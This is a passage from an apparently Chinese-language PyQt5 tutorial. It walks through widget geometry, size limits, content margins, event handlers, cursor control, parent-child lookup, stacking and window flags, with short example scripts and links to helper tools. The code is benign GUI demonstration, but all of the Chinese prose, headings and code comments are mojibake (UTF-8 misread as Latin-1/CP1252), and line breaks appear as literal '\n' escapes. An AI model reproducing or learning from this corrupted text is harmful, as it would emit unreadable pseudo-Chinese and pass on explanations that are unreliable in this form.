   0, 0, width, heightçš„ç»„åˆ\n- frameSize()                æ¡†æ¶å¤§å°\n- frameGeometry()      æ¡†æ¶å°ºå¯¸\n\næ³¨æ„: æ§ä»¶æ˜¾ç¤ºå®Œæ¯•ä¹‹å, å…·ä½“çš„ä½ç½®æˆ–è€…å°ºå¯¸æ•°æ®æ‰ä¼šæ­£ç¡®\n\n![ç›¸å…³å°ºå¯¸å›¾ç¤º](https://img.jwt1399.top//img/20210729085614.png)\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QWidget\nimport sys\n\napp = QApplication(sys.argv)\nwindow = QWidget()\nwindow.resize(200, 200)\nwindow.move(100, 100)\nwindow.setWindowTitle('å°ºå¯¸å¤§å°')\nprint(window.geometry())  # è¾“å‡ºï¼š PyQt5.QtCore.QRect(100, 100, 200, 200) é”™è¯¯\n\nwindow.show()\nprint(window.geometry())  # è¾“å‡ºï¼š PyQt5.QtCore.QRect(101, 131, 200, 200) æ­£ç¡®\nsys.exit(app.exec_())\n```\n\næ‰€ä»¥ï¼Œè¦è·å–æ§ä»¶çš„å°ºå¯¸ï¼Œä¸€å®šè¦åœ¨æ§ä»¶æ˜¾ç¤ºå®Œæ¯•ä¹‹åå†å»è·å–ï¼\n\n#### å°ºå¯¸è®¾ç½®API\n\n- move(x,y)                                    æ“æ§çš„æ˜¯x, yï¼›ä¹Ÿå°±æ˜¯posï¼ŒåŒ…æ‹¬çª—å£æ¡†æ¶\n- resize(width,height)                    æ“æ§çš„æ˜¯å®½é«˜ï¼Œä¸åŒ…æ‹¬çª—å£æ¡†æ¶\n- setGeometry(x_noFrame, y_noFrame, width, height)    æ³¨æ„ï¼Œæ­¤å¤„å‚ç…§ä¸ºç”¨æˆ·åŒºåŸŸ\n- adjustSize()                æ ¹æ®å†…å®¹è‡ªé€‚åº”å¤§å°\n- setFixedSize()             è®¾ç½®å›ºå®šå°ºå¯¸\n\nç‚¹å‡»æŒ‰é’®ï¼Œå¤åˆ¶æ ‡ç­¾å†…å®¹ï¼Œå±•ç¤ºåœ¨æ ‡ç­¾åé¢\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QWidget,QPushButton,QLabel\nimport sys\n\napp = QApplication(sys.argv)\nwindow = QWidget()\nwindow.resize(400, 400)\nwindow.move(100, 100)\nwindow.setWindowTitle('è‡ªé€‚åº”å°ºå¯¸')\n\nlabel = QLabel(window)\nlabel.setText(\"hello world\")\nlabel.move(100, 100)\nlabel.setStyleSheet(\"background-color:cyan;\")  # ä¸ºäº†æ›´æ¸…æ™°çœ‹åˆ°å…·ä½“çš„åŒºåŸŸ\n\ndef addContent():\n    new_content = label.text() + \"hello world\"\n    label.setText(new_content)\n    # label.resize(label.width()+100,label.height())  ç¬¨æ–¹æ³• æ”¹å˜å¤§å°\n    label.adjustSize() #è‡ªé€‚åº”å¤§å°\n\nbtn = QPushButton(window)\nbtn.setText(\"å¢åŠ å†…å®¹\")\nbtn.move(200, 200)\nbtn.clicked.connect(addContent)\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\n#### æ¡ˆä¾‹\n\né€šè¿‡ç»™å®šçš„çš„ä¸ªæ•°ï¼Œä½ è´Ÿè´£åœ¨ä¸€ä¸ªçª—å£å†…åˆ›å»ºç›¸åº”ä¸ªæ•°çš„å­æ§ä»¶ï¼ŒæŒ‰ç…§ä¹å®«æ ¼çš„å¸ƒå±€è¿›è¡Œæ‘†æ”¾\n\n```python\nfrom PyQt5.Qt import * #åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n#åˆ›å»ºapp\napp  = QApplication(sys.argv)\nwindow = QWidget()\nwindow.show()\nwindow.resize(500,500)\nwindow.move(300,300)\n\n#æ€»æ§ä»¶çš„ä¸ªæ•°\nwidget_count = 10\n\n#æœ‰å¤šå°‘åˆ—\ncolumn_count = 3\n#ä¸€ä¸ªæ§ä»¶çš„å®½åº¦\nwidget_width = window.width() / column_count\n\n#æœ‰å¤šå°‘è¡Œ\nrow_count  = (widget_count-1) // column_count +1\n#ä¸€ä¸ªæ§ä»¶çš„é«˜åº¦\nwidget_height = window.height() / row_count\n\nfor i in range(widget_count):\n     w = QWidget(window)\n     w.resize(widget_width,widget_height)\n\n     # w.move(widget_width * (i % column_count), widget_height * (i // column_count))\n     x,y = divmod(i,column_count) # x,y = (i//column_count, i%column_count)\n     w.move(widget_width*y,widget_height*x)\n\n     w.setStyleSheet(\"background-color:red;border:1px solid yellow\")\n     w.show()\n\nsys.exit(app.exec_())\n```\n\n#### è¾…åŠ©å·¥å…·\n\nä¸‹è½½åœ°å€ï¼šhttps://jwt1399.lanzoui.com/iGnrtrz68fg\n\næ­¤å·¥å…·å¯¹ Qwidget å°ºå¯¸å¤§å°ä½ç½® API è¿›è¡Œäº†å…¨é¢ä½¿ç”¨ï¼Œæ‹–åŠ¨çª—å£å¯å®æ—¶æ˜¾ç¤ºç›¸å…³ä½ç½®ä¿¡æ¯ã€‚\n\n![è¾…åŠ©å·¥å…·å›¾ç¤º](https://img.jwt1399.top//img/20210729091303.png)\n\n### æœ€å¤§æœ€å°å°ºå¯¸\n\n#### è·å–API\n\n- minimumWidth()     æœ€å°å°ºå¯¸çš„å®½åº¦\n\n- minimumHeight()    æœ€å°å°ºå¯¸çš„é«˜åº¦\n\n- minimumSize()         æœ€å°å°ºå¯¸(å®½ï¼Œé«˜)\n\n- maximumWidth()     æœ€å¤§å°ºå¯¸çš„å®½åº¦\n\n- maximumHeight()    æœ€å¤§å°ºå¯¸çš„é«˜åº¦\n\n- maximumSize()         æœ€å¤§å°ºå¯¸\n\n#### è®¾ç½®API\n\n- setMinimumWidth()      è®¾ç½®æœ€å°å®½åº¦\n- setMaximumWidth()    è®¾ç½®æœ€å¤§å®½åº¦\n\n- setMinimumHeight()    è®¾ç½®æœ€å°é«˜åº¦\n\n- setMinimumSize()         è®¾ç½®æœ€å°å°ºå¯¸\n\n- setMaximumHeight()   è®¾ç½®æœ€å¤§é«˜åº¦\n\n- setMaximumSize()        è®¾ç½®æœ€å¤§å°ºå¯¸\n\n#### æ¡ˆä¾‹\n\nåˆ›å»ºä¸€ä¸ªçª—å£, è®¾ç½®æœ€å°å°ºå¯¸(200,200)å’Œæœ€å¤§å°ºå¯¸(400,400)ï¼Œæµ‹è¯•é€šè¿‡resizeæ˜¯å¦å¯ä»¥æ”¹å˜\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\nimport sys\n\napp = QApplication(sys.argv)\n\nwindow = QMainWindow()\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('æœ€å¤§æœ€å°å°ºå¯¸')\nwindow.setMinimumSize(200,200) #ä¹Ÿå¯å•ç‹¬é™åˆ¶å®½å’Œé«˜\nwindow.setMaximumSize(400,400)\nprint(window.maximumSize())\nwindow.resize(500,500)  #é€šè¿‡ä»£ç ä¹Ÿæ˜¯æ— æ³•ä¿®æ”¹çš„\nprint(window.maximumSize())\n\nwindow.show()\nsys.exit(app.exec_())\n\n'''\nè¾“å‡ºï¼š\nPyQt5.QtCore.QSize(400, 400)\nPyQt5.QtCore.QSize(400, 400)\n'''\n```\n\n### å†…å®¹è¾¹è·\n\n#### API\n\n- setContentsMargins(å·¦, ä¸Š, å³, ä¸‹)    è®¾ç½®å†…å®¹è¾¹è·\n\n- getContentsMargins()   è·å–å†…å®¹è¾¹è·(å·¦, ä¸Š, å³, ä¸‹)ï¼Œå…ƒç»„\n\n- contentsRect()   è·å–å†…å®¹åŒºåŸŸ\n\n#### æ¡ˆä¾‹\n\nåˆ›å»ºä¸€ä¸ªçª—å£, åŒ…å«ä¸€ä¸ªæ ‡ç­¾ï¼Œæ ‡ç­¾æ–‡æœ¬ä¸º\"Hello World\"ï¼Œæ ‡ç­¾å¤§å°ä¸º(100, 60)ï¼Œå°†æ–‡æœ¬æ”¾åœ¨æ ‡ç­¾çš„å³ä¸‹è§’ï¼Œ*é»˜è®¤æ–‡æœ¬æ˜¾ç¤ºæ˜¯æ°´å¹³é å·¦ï¼Œå‚ç›´å±…ä¸­çš„*\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\napp = QApplication(sys.argv)\n\nwindow = QMainWindow()\nwindow.resize(400, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('æœ€å¤§æœ€å°å°ºå¯¸')\n\nlabel = QLabel(window)\nlabel.setText(\"Hello,world\")\nlabel.resize(200,200)\nlabel.setStyleSheet(\"background-color:cyan;border:1px solid red\")\nlabel.setContentsMargins(100,100,0,0)  # è®¾ç½®å†…å®¹è¾¹è·ï¼Œå››ä¸ªå‚æ•°æ˜¯è¾¹è·,é¡ºæ—¶é’ˆ(å·¦ä¸Šå³ä¸‹)\nprint(label.getContentsMargins())      #æ‰“å°å„ä¸ªè¾¹å†…å®¹è¾¹è·è®¾ç½®çš„å…·ä½“å€¼\nprint(label.contentsRect())            #æ‰“å°å„ä¸ªè¾¹å†…å®¹è¾¹è·è®¾ç½®çš„å…·ä½“å€¼\n\nwindow.show()\nsys.exit(app.exec_())\n\n'''\nè¾“å‡ºï¼š\n(100, 100, 0, 0)\nPyQt5.QtCore.QRect(100, 100, 100, 100)\n'''\n```\n\n### äº‹ä»¶*\n\n#### API\n\næ˜¾ç¤ºå’Œå…³é—­äº‹ä»¶\n\n- showEvent(QShowEvent) æ§ä»¶æ˜¾ç¤ºæ—¶è°ƒç”¨\n- closeEvent(QCloseEvent) æ§ä»¶å…³é—­æ—¶è°ƒç”¨\n\nç§»åŠ¨äº‹ä»¶\n\n- moveEvent(QMoveEvent) æ§ä»¶ç§»åŠ¨æ—¶è°ƒç”¨\n\nè°ƒæ•´å¤§å°\n\n- resizeEvent(QResizeEvent) æ§ä»¶è°ƒæ•´å¤§å°æ—¶è°ƒç”¨\n\né¼ æ ‡äº‹ä»¶\n\n- enterEvent(QEvent) é¼ æ ‡è¿›å…¥æ—¶è§¦å‘\n- leaveEvent(QEvent) é¼ æ ‡ç¦»å¼€æ—¶è§¦å‘\n- mousePressEvent(QMouseEvent)  é¼ æ ‡æŒ‰ä¸‹æ—¶è§¦å‘\n- mouseReleaseEvent(QMouseEvent)  é¼ æ ‡é‡Šæ”¾æ—¶è§¦å‘\n- mouseDoubleClickEvent(QMouseEvent)  é¼ æ ‡åŒå‡»æ—¶è§¦å‘\n- mouseMoveEvent(QMouseEvent)  \n  - é¼ æ ‡æŒ‰ä¸‹åç§»åŠ¨æ—¶è§¦å‘\n  - setMouseTracking(True) è¿½è¸ªè®¾ç½®åï¼Œæ²¡æœ‰æŒ‰ä¸‹çš„ç§»åŠ¨ä¹Ÿèƒ½è§¦å‘ \n\né”®ç›˜äº‹ä»¶\n\n- keyPressEvent(QKeyEvent)  é”®ç›˜æŒ‰ä¸‹æ—¶è°ƒç”¨\n- keyReleaseEvent(QKeyEvent)  é”®ç›˜é‡Šæ”¾æ—¶è°ƒç”¨\n\nç„¦ç‚¹äº‹ä»¶\n\n- focusInEvent(QFocusEvent)    è·å–ç„¦ç‚¹æ—¶è°ƒç”¨\n- focusOutEvent(QFocusEvent) å¤±å»ç„¦ç‚¹æ—¶è°ƒç”¨\n\næ‹–æ‹½äº‹ä»¶\n\n- dragEnterEvent(QDragEnterEvent)  æ‹–æ‹½è¿›å…¥æ§ä»¶æ—¶è°ƒç”¨\n- dragLeaveEvent(QDragLeaveEvent) æ‹–æ‹½ç¦»å¼€æ§ä»¶æ—¶è°ƒç”¨\n- dragMoveEvent(QDragMoveEvent)  æ‹–æ‹½åœ¨æ§ä»¶å†…ç§»åŠ¨æ—¶è°ƒç”¨\n- dropEvent(QDropEvent)  æ‹–æ‹½æ”¾ä¸‹æ—¶è°ƒç”¨\n\nç»˜åˆ¶äº‹ä»¶\n\n- paintEvent(QPaintEvent)  æ˜¾ç¤ºæ§ä»¶, æ›´æ–°æ§ä»¶æ—¶è°ƒç”¨\n\næ”¹å˜äº‹ä»¶\n\n- changeEvent(QEvent)  çª—ä½“æ”¹å˜, å­—ä½“æ”¹å˜æ—¶è°ƒç”¨\n\nå³é”®èœå•\n\n- contextMenuEvent(QContextMenuEvent)  è®¿é—®å³é”®èœå•æ—¶è°ƒç”¨\n\nè¾“å…¥æ³•\n\n- inputMethodEvent(QInputMethodEvent)  è¾“å…¥æ³•è°ƒç”¨\n\n#### APIæµ‹è¯•\n\n```python\nfrom PyQt5.Qt import *  # åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # ç»§æ‰¿çˆ¶ç±»çš„initæ–¹æ³•\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('äº‹ä»¶')\n        self.setup_ui()\n\n\n    def setup_ui(self):\n        pass\n\n    def showEvent(self, QShowEvent):\n        print(\"çª—å£è¢«å±•ç¤ºäº†\")\n    def closeEvent(self,QCloseEvent):\n        print(\"çª—å£è¢«å…³é—­äº†\")\n    def moveEvent(self,QMoveEvent):\n        print(\"çª—å£è¢«ç§»åŠ¨äº†\")\n    def resizeEvent(self, QSizeEvent):\n        print(\"çª—å£è¢«æ”¹å˜äº†å¤§å°\")\n    def enterEvent(self, QEvent):\n        print(\"é¼ æ ‡è¿›å…¥\")\n    def leaveEvent(self, QEvent):\n        print(\"é¼ æ ‡ç¦»å¼€\")\n    def mousePressEvent(self, QMouseEvent):\n        print(\"é¼ æ ‡æŒ‰å‹\")\n    def mouseMoveEvent(self, QMouseEvent):\n        print(\"é¼ æ ‡æŒ‰ä¸‹ç§»åŠ¨\")\n\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv) # åˆ›å»ºåº”ç”¨ç¨‹åºå¯¹è±¡\n    window = Window()\n    window.setMouseTracking(True)  # è®¾ç½®é¼ æ ‡è¿½è¸ª\n    window.show() # å±•ç¤ºæ§ä»¶\n    sys.exit(app.exec_())\n```\n\n#### æ¡ˆåˆ—\n\nã€‚ã€‚ã€‚\n\n### é¼ æ ‡ç›¸å…³*\n\n#### API\n\n- setCursor(å‚æ•°) è®¾ç½®é¼ æ ‡å½¢çŠ¶\n\n![é¼ æ ‡å½¢çŠ¶](https://img.jwt1399.top//img/20210730115018.png)\n\né™¤äº†ä»¥ä¸Šç³»ç»Ÿæä¾›å‚æ•°ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰QCursorå¯¹è±¡\n\n- unsetCursor()  é‡ç½®å½¢çŠ¶\n\n- cursor() -> QCursor   è·å–é¼ æ ‡\n  - QCursorå¯¹è±¡\n    - pixmap()  å›¾ç‰‡\n    - pos()  é¼ æ ‡ä½ç½®ï¼Œç›¸å¯¹äºæ•´ä¸ªå±å¹•çš„å·¦ä¸Šè§’\n    - setPos(x, y) è®¾ç½®é¼ æ ‡ä½ç½®\n\né¼ æ ‡è·Ÿè¸ª\n\n- hasMouseTracking()  åˆ¤å®šæ˜¯å¦è®¾ç½®äº†é¼ æ ‡è·Ÿè¸ª\n- setMouseTracking(bool)  è®¾ç½®é¼ æ ‡æ˜¯å¦è·Ÿè¸ª\n  - æ‰€è°“çš„é¼ æ ‡è·Ÿè¸ªï¼Œå…¶å®å°±æ˜¯è®¾ç½®æ£€æµ‹é¼ æ ‡ç§»åŠ¨äº‹ä»¶çš„æ¡ä»¶\n  - ä¸è·Ÿè¸ª  é¼ æ ‡ç§»åŠ¨æ—¶ï¼Œå¿…é¡»å¤„äºæŒ‰ä¸‹çŠ¶æ€ï¼Œæ‰ä¼šè§¦å‘mouseMoveEventäº‹ä»¶\n  - è·Ÿè¸ª      é¼ æ ‡ç§»åŠ¨æ—¶ï¼Œä¸å¤„äºæŒ‰ä¸‹çŠ¶æ€ï¼Œä¹Ÿä¼šè§¦å‘mouseMoveEventäº‹ä»¶\n\n#### APIæµ‹è¯•\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\napp = QApplication(sys.argv)\n\nclass MyWindow(QWidget):\n     def mouseMoveEvent(self, event): # ç‚¹å‡» QMouseEvent å¯ä»¥æŸ¥çœ‹é‡Œé¢åŒ…å«çš„æ–¹æ³•\n         # print(\"é¼ æ ‡ç§»åŠ¨äº†\",event.globalPos())  # globalPos() æ˜¯æ•´ä¸ªå±å¹•ä¸ºå‡†\n         print(\"é¼ æ ‡ç§»åŠ¨äº†\",event.localPos())  # localPos() æ˜¯æ§ä»¶æœ¬èº«ä¸ºå‡†\n\nwindow = MyWindow()\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('é¼ æ ‡')\n# window.setCursor(Qt.BusyCursor) #è®¾ç½®å¿™ç¢Œé¼ æ ‡ï¼Œè½¬åœˆåœˆçš„æ ·å¼\npixmap = QPixmap(\"C:/Users/admin/Pictures/centos.png\").scaled(50,50) #è®¾ç½®é¼ æ ‡æ ·å¼å’Œå¤§å°\ncursor = QCursor(pixmap,0,0)  #è®¾ç½®é¼ æ ‡æ ·å¼å’Œçƒ­ç‚¹ï¼Œé»˜è®¤çƒ­ç‚¹ä¸ºå›¾ç‰‡ä¸­å¿ƒï¼ˆ-1ï¼Œ-1ï¼‰ï¼Œçƒ­ç‚¹ç‚¹å‡»ç›¸åº”ä½ç½®é¼ æ ‡ç‚¹å‡»æ‰ä¼šè§¦å‘ï¼Œä¿®æ”¹ä¸ºï¼ˆ0,0ï¼‰ï¼Œ è¿™å°±æ˜¯å›¾ç‰‡çš„å·¦ä¸Šè§’æˆä¸ºçƒ­ç‚¹ã€‚\nwindow.setCursor(cursor)\n# window.unsetCursor()  # é‡ç½®é¼ æ ‡å½¢çŠ¶ï¼Œä½¿ä¸Šé¢çš„è®¾ç½®å¤±æ•ˆ\n\ncurrent_cursor = window.cursor()  #è·å–é¼ æ ‡å¯¹è±¡\nprint(current_cursor.pos())  #è·å–é¼ æ ‡çš„ä½ç½®ï¼Œå®ƒæ˜¯ç›¸å¯¹äºæ•´ä¸ªç”µè„‘å±å¹•çš„\ncurrent_cursor.setPos(0,0)  # è¿™æ—¶é¼ æ ‡çš„ä½ç½®åœ¨å±å¹•çš„å·¦ä¸Šè§’\n\nwindow.setMouseTracking(True)  #è®¾ç½®è·Ÿè¸ª\nprint(window.hasMouseTracking())  #æŸ¥çœ‹é¼ æ ‡æ˜¯å¦å¤„äºè·Ÿè¸ªçŠ¶æ€\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\n#### æ¡ˆä¾‹\n\nã€‚ã€‚ã€‚\n\n#### è¾…åŠ©å·¥å…·\n\nä¸‹è½½åœ°å€ï¼šhttps://jwt1399.lanzoui.com/iy5gBrz6api\n\næ­¤å·¥å…·å¯¹ QCursor é¼ æ ‡å½¢çŠ¶ API è¿›è¡Œäº†å…¨é¢ä½¿ç”¨ï¼Œé€‰æ‹©å¯¹åº”å•é€‰æ¡†ï¼Œå¯æŸ¥çœ‹å¯¹åº”é¼ æ ‡æ•ˆæœï¼Œè¿˜å¯è‡ªå®šä¹‰é¼ æ ‡å½¢çŠ¶ã€‚\n\n![è¾…åŠ©å·¥å…·](https://img.jwt1399.top//img/20210730164242.png)\n\n### çˆ¶å­å…³ç³»\n\n#### API\n\n- childAt(x, y)  è·å–åœ¨æŒ‡å®šåæ ‡çš„æ§ä»¶\n- parentWidget()  è·å–æŒ‡å®šæ§ä»¶çš„çˆ¶æ§ä»¶\n- childrenRect()  æ‰€æœ‰å­æ§ä»¶ç»„æˆçš„è¾¹ç•ŒçŸ©å½¢\n\n#### æ¡ˆä¾‹\n\nåˆ›å»ºçª—å£, åŒ…å«è‹¥å¹² Label æ§ä»¶ï¼Œç‚¹å‡»å“ªä¸ªæ ‡ç­¾, å°±è®©å“ªä¸ªæ ‡ç­¾èƒŒæ™¯å˜çº¢ï¼Œä½¿ç”¨çˆ¶æ§ä»¶å¤„ç†å’Œè‡ªå®šä¹‰ QLabel å­ç±» ä¸¤ç§æ–¹æ³•å®ç°\n\næ–¹æ³•ä¸€ï¼šè‡ªå®šä¹‰ QLabel å­ç±»\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Label(QLabel):\n    def mousePressEvent(self, QMouseEvent):\n        self.setStyleSheet(\"background-color:red\")\n         \n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = QMainWindow()\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"çˆ¶å­å…³ç³»\")\n\nfor i in range(10):\n    label = Label(window)\n    label.setText(\"æ ‡ç­¾\"+str(i))\n    label.move(30*i,30*i)\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\næ–¹æ³•äºŒï¼šä½¿ç”¨çˆ¶æ§ä»¶å¤„ç†\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QWidget):\n    def mousePressEvent(self, event):\n        local_x = event.x()\n        local_y = event.y()\n        sub_widget = self.childAt(local_x,local_y) #å­æ§ä»¶\n        if sub_widget:  # æ’é™¤sub_widget æ˜¯None\n            sub_widget.setStyleSheet(\"background-color:red;\")\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = Window()\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"çˆ¶å­å…³ç³»\")\n\nfor i in range(10):\n    label = QLabel(window)\n    label.setText(\"æ ‡ç­¾\"+str(i))\n    label.move(30*i,30*i)\n\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n#è¿›å…¥æ¶ˆæ¯å¾ªç¯\nsys.exit(app.exec_())\n```\n\n### å±‚çº§æ§åˆ¶\n\n#### API\n\n- lower()  å°†æ§ä»¶é™ä½åˆ°æœ€åº•å±‚\n- raise_()  å°†æ§ä»¶æå‡åˆ°æœ€ä¸Šå±‚\n- a.stackUnder(b) è®©aæ”¾åœ¨bä¸‹é¢\n\n### é¡¶å±‚çª—å£ç›¸å…³\n\n#### API\n\nâ€‹\tå›¾æ ‡\n\n- setWindowIcon(QIcon(\"resource/header_icon.png\"))\n\n- windowIcon()\n\næ ‡é¢˜\n\n- setWindowTitle(\"ç¤¾ä¼šæˆ‘é¡ºå“¥\")\n\n- windowTitle()\n\nä¸é€æ˜åº¦\n\n- setWindowOpacity(float)\n  - 1.0 ä¸é€æ˜\n  - 0.0 é€æ˜\n\n- windowOpacity()\n\nâ€‹\tçª—å£çŠ¶æ€\n\n- setWindowState(state)\n  - Qt.WindowNoState æ— çŠ¶æ€\n  - Qt.WindowMinimized æœ€å°åŒ–\n  - Qt.WindowMaximized æœ€å¤§åŒ–\n  - Qt.WindowFullScreen å…¨å±\n  - Qt.WindowActive æ´»åŠ¨çª—å£\n- windowState() \n\næœ€å¤§åŒ–æœ€å°åŒ–\n\nâ€‹\tæ§åˆ¶\n\n- showFullScreen() å…¨å±æ˜¾ç¤º ä¸åŒ…å«çª—å£æ¡†æ¶\n- showMaximized() æœ€å¤§åŒ– åŒ…æ‹¬çª—å£æ¡†æ¶\n- showMinimized() æœ€å°åŒ–\n- showNormal() æ­£å¸¸\n\n  åˆ¤å®š\n\n- isMinimized() æ˜¯å¦æ˜¯æœ€å°åŒ–çª—å£\n- isMaximized() æ˜¯å¦æ˜¯æœ€å¤§åŒ–çª—å£\n- isFullScreen() æ˜¯å¦å…¨å±\t\n\nçª—å£æ ‡å¿—\n\n- windowFlags()\n\n- setWindowFlags(Qt.WindowStaysOnTopHint)\n\n  - çª—å£æ ·å¼\n\n  ```python\n  Qt.Widget \t\t#é»˜è®¤,ä¸€ä¸ªçª—å£æˆ–æ§ä»¶ï¼ŒåŒ…å«çª—å£è¾¹æ¡†ã€æ ‡é¢˜æ ï¼ˆå›¾æ ‡ã€æ ‡é¢˜ã€æœ€å°åŒ–ã€æœ€å¤§åŒ–ã€å…³é—­ï¼‰\n  Qt.Window \t\t#ä¸€ä¸ªçª—å£ï¼ŒåŒ…å«çª—å£è¾¹æ¡†å’Œæ ‡é¢˜æ ï¼ˆå›¾æ ‡ã€æ ‡é¢˜ã€æœ€å°åŒ–ã€æœ€å¤§åŒ–ã€å…³é—­ï¼‰\n  Qt.Dialog \t\t#ä¸€ä¸ªå¯¹è¯æ¡†çª—å£ï¼Œçª—å£è¾¹æ¡†ã€æ ‡é¢˜æ ï¼ˆå›¾æ ‡ã€æ ‡é¢˜ã€é—®å·ã€å…³é—­ï¼‰\n  Qt.Sheet \t\t#ä¸€ä¸ªçª—å£æˆ–éƒ¨ä»¶Macintoshè¡¨å•\n  Qt.Drawer \t\t#ä¸€ä¸ªçª—å£æˆ–éƒ¨ä»¶MacintoshæŠ½å±‰\n  Qt.Popup \t\t#ä¸€ä¸ªå¼¹å‡ºå¼é¡¶å±‚çª—å£\n  Qt.Tool \t\t#ä¸€ä¸ªå·¥å…·çª—å£\n  Qt.ToolTip \t\t#ä¸€ä¸ªæç¤ºçª—å£ï¼Œæ²¡æœ‰æ ‡é¢˜æ å’Œçª—å£è¾¹æ¡†\n  Qt.SplashScreen #ä¸€ä¸ªæ¬¢è¿çª—å£ï¼Œæ˜¯QSplashScreenæ„é€ å‡½æ•°çš„é»˜è®¤å€¼\n  Qt.SubWindow \t#ä¸€ä¸ªå­çª—å£\n  ```\n\n  - é¡¶å±‚çª—å£å¤–è§‚æ ‡å¿—\t\t\n\n  ```python\n  Qt.MSWindowsFixedSizeDialogHint \t#çª—å£æ— æ³•è°ƒæ•´å¤§å°\n  Qt.FramelessWindowHint \t\t\t\t#çª—å£æ— è¾¹æ¡†\n  Qt.CustomizeWindowHint \t\t\t\t#æœ‰è¾¹æ¡†ä½†æ— æ ‡é¢˜æ å’ŒæŒ‰é’®ï¼Œä¸èƒ½ç§»åŠ¨å’Œæ‹–åŠ¨\n  Qt.WindowTitleHint \t\t\t\t\t#æ·»åŠ æ ‡é¢˜æ å’Œä¸€ä¸ªå…³é—­æŒ‰é’®\n  Qt.WindowSystemMenuHint \t\t\t#æ·»åŠ ç³»ç»Ÿç›®å½•å’Œä¸€ä¸ªå…³é—­æŒ‰é’®\n  Qt.WindowMaximizeButtonHint\t\t\t#æ¿€æ´»æœ€å¤§åŒ–å’Œå…³é—­æŒ‰é’®ï¼Œç¦æ­¢æœ€å°åŒ–æŒ‰é’®\n  Qt.WindowMinimizeButtonHint\t\t\t#æ¿€æ´»æœ€å°åŒ–å’Œå…³é—­æŒ‰é’®ï¼Œç¦æ­¢æœ€å¤§åŒ–æŒ‰é’®\n  Qt.WindowMinMaxButtonsHint\t\t\t#æ¿€æ´»æœ€å°åŒ–ï¼Œæœ€å¤§åŒ–å’Œå…³é—­æŒ‰é’®\n  Qt.WindowCloseButtonHint\t\t\t#æ·»åŠ ä¸€ä¸ªå…³é—­æŒ‰é’®\n  Qt.WindowContextHelpButtonHint\t\t#æ·»åŠ é—®å·å’Œå…³é—­æŒ‰é’®ï¼ŒåŒå¯¹è¯æ¡†\n  Qt.WindowStaysOnTopHint\t\t\t\t#çª—å£å§‹ç»ˆå¤„äºé¡¶å±‚ä½ç½®\n  Qt.WindowStaysOnBottomHint\t\t\t#çª—å£å§‹ç»ˆå¤„äºåº•å±‚ä½ç½®\n  ```\n\né€šè¿‡ setWindowFlagsæ¥è®¾ç½®çª—å£çš„ WIndowFlagsï¼Œå¤šä¸ª WindowFlagsä¹‹é—´ç”¨ `|` è¿æ¥ï¼Œå¦‚ï¼š\n\n```python\nwindow = QWidget()\nwindow.setWindowFlags(Qt.Tool | Qt.FramelessWindowHint)\n```\n\nå–æ¶ˆæŸä¸ª WindowFlagsï¼š\n\n```python\nwindow.setWindowFlags(window.windowFlags() & ~Qt.FramelessWindowHint)\n```\n\nåˆ¤æ–­æ˜¯å¦è®¾ç½®äº†æŸä¸ª WindowFlagsï¼š\n\n```python\n(widget.windowFlags() | Qt.FramelessWindowHint) == window.windowFlags()\n```\n\n#### APIæµ‹è¯•\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QWidget): #é€šè¿‡åˆ¤å®šçª—å£çš„çŠ¶æ€å®ç°ç‚¹å‡»çª—å£åˆ‡æ¢æœ€å¤§å’Œæ­£å¸¸\n    def mousePressEvent(self, QMouseEvent):\n        if self.isMaximized():\n            self.showNormal()\n        else:\n            self.showMaximized()\n\n#åˆ›å»ºapp\napp = QApplication(sys.argv)\n\n#åˆ›å»ºæ§ä»¶\nwindow = Window()\n\n#è®¾ç½®æ§ä»¶\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"é¡¶å±‚çª—å£ç›¸å…³\") #è®¾ç½®æ ‡é¢˜\nprint(window.windowTitle())  #è·å–æ ‡é¢˜\n\nwindow.setWindowIcon(QIcon(\"C:/Users/admin/Pictures/jj.ico\"))  #è®¾ç½®å›¾æ ‡\nprint(window.windowIcon())  #è·å–å›¾æ ‡\n\nwindow.setWindowOpacity(0.8)  #è®¾ç½®ä¸é€æ˜åº¦\nprint(window.windowOpacity()) #è·å–ä¸é€æ˜åº¦\n\nprint(window.windowState() == Qt.WindowNoState)  # True  è¯´æ˜é»˜è®¤æ˜¯æ— çŠ¶æ€\nwindow.setWindowState(Qt.WindowMinimized)  #æœ€å°åŒ–\n\n#å±•ç¤ºæ§ä»¶\nwindow.show()\n# window.showMaximized()  #å±•ç¤ºæœ€å¤§ï¼Œè¿™æ—¶ä¸Šé¢çš„window.show() ä¹Ÿå¯ä»¥ä¸ç”¨è¦\n# window.showFullScreen()\n# 